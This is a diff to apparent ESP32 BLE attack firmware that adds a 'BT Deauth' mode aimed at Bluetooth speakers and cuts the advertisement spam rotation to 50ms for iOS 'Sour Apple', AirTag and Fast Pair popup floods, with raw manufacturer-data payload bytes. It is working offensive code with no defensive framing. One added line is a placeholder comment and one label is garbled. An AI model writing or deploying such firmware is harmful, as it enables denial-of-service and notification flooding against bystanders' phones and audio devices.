@@ -78,11 +78,20 @@ void BLEScanner::swiftPair() {
 void BLEScanner::airTagSpam() {
     if (attackMode) stopAttack();
     attackMode = true;
-    attackType = 4; // AirTag
+    attackType = 4; // AirGT
     attackStart = millis();
-    lastPayloadSwitch = 0;
+    lastPayloadSwitch = 0; // Trigger immediate update in loop
     payloadIndex = 0;
     Serial.println("[BLE] Starting AirTag Spam Rotation");
+}
+
+void BLEScanner::btDeauth() {
+    if (attackMode) stopAttack();
+    attackMode = true;
+    attackType = 5; // BTDeauth
+    attackStart = millis();
+    lastPayloadSwitch = 0;
+    Serial.println("[BLE] Starting BT Deauth Rotation");
 }
 
 // Samsung/Google Fast Pair (Watch 4 / Buds Pro)
@@ -134,12 +143,13 @@ void BLEScanner::loop() {
             return;
         }
 
-        // PAYLOAD ROTATION (Every 200ms)
-        if (millis() - lastPayloadSwitch > 200) {
+        // PAYLOAD ROTATION (Every 50ms - EXTREME SPEED)
+        if (millis() - lastPayloadSwitch > 50) {
             lastPayloadSwitch = millis();
             pAdvertising->stop();
-
+            
             NimBLEAdvertisementData advert;
+            // ... rest of the logic
 
             // ===================================
             // SOUR APPLE (iOS) - 13+ Types
@@ -204,6 +214,14 @@ void BLEScanner::loop() {
                     (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
                     (uint8_t)random(256), (uint8_t)random(256)
                 };
+                advert.setManufacturerData(std::string((char*)payload, sizeof(payload)));
+            }
+            // ===================================
+            // BT DEAUTH (Speaker focus)
+            // ===================================
+            else if (attackType == 5) {
+                // Randomize payload to look like a connection request or error
+                uint8_t payload[] = { 0x4C, 0x00, 0x12, 0x19, 0x10, (uint8_t)random(256), (uint8_t)0xFF, (uint8_t)0xEE };
                 advert.setManufacturerData(std::string((char*)payload, sizeof(payload)));
             }
             
